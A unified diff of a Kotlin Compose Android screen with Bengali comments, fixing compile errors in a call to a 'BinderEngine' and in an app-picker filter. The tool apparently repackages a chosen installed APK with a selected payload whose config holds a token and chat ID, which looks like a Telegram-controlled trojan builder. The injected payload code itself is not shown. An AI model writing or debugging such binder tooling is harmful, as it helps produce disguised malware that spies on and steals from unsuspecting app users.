@@ -132,21 +132,18 @@ fun HomeScreen() {
                 val dirDoc = DocumentFile.fromTreeUri(ctx, dir)
                     ?: throw IllegalStateException("Invalid output folder")
                 
-                // FIX: BinderEngine(ctx).bind(...) এর বদলে আপনার BinderEngine.kt এর স্ট্রাকচার অনুযায়ী কল করুন
-                // যদি BinderEngine একটি object হয়, তবে: BinderEngine.bind(ctx, ...)
-                // যদি BinderEngine একটি class হয়, তবে: BinderEngine(ctx).bind(...)
-                // যেহেতু আপনার আগের কোডে BinderEngine(ctx) ছিল, আমি সেটাই রেখেছি।
-                // তবে নিশ্চিত করুন BinderEngine.kt এ class BinderEngine(val context: Context) { fun bind(...) } আছে।
-                
+                // আপনার BinderEngine.kt-এর রিটার্ন টাইপ ও প্যারামিটার অনুযায়ী এটি ঠিক করা হয়েছে
                 BinderEngine(ctx).bind(
                     source = uri,
                     activity = activityInput.trim(),
                     label = apkLabel,
                     features = selected.toSet(),
                     config = PayloadConfig(token, chatId, selected.map { it.key }, null),
-                    outDir = dirDoc,
-                    onLog = { level, message -> log(level, message) }
-                )
+                    outDir = dirDoc
+                ) { level, message -> 
+                    log(level, message) 
+                }
+                
             } catch (t: Throwable) {
                 log(LogLevel.ERROR, t.message ?: "Binding failed")
             } finally {
@@ -299,9 +296,9 @@ private fun AppPickerDialog(onDismiss: () -> Unit, onPick: (ApplicationInfo) -> 
         }
     }
 
-    // FIX: Explicit Type declaration for filtered list
-    val filtered: List<ApplicationInfo> = apps.filter {
-        query.isBlank() || it.loadLabel(ctx.packageManager).toString().contains(query, true)
+    // টাইপ এক্সপ্লিসিটলি বলে দেওয়া হয়েছে যাতে কম্পাইলার কনফিউজ না করে
+    val filtered: List<ApplicationInfo> = apps.filter { appInfo ->
+        query.isBlank() || appInfo.loadLabel(ctx.packageManager).toString().contains(query, true)
     }
 
     AlertDialog(
@@ -332,7 +329,6 @@ private fun AppPickerDialog(onDismiss: () -> Unit, onPick: (ApplicationInfo) -> 
                         Modifier.heightIn(max = 380.dp),
                         verticalArrangement = Arrangement.spacedBy(4.dp)
                     ) {
-                        // FIX: Explicit type for item
                         items(filtered) { info: ApplicationInfo ->
                             Row(
                                 Modifier
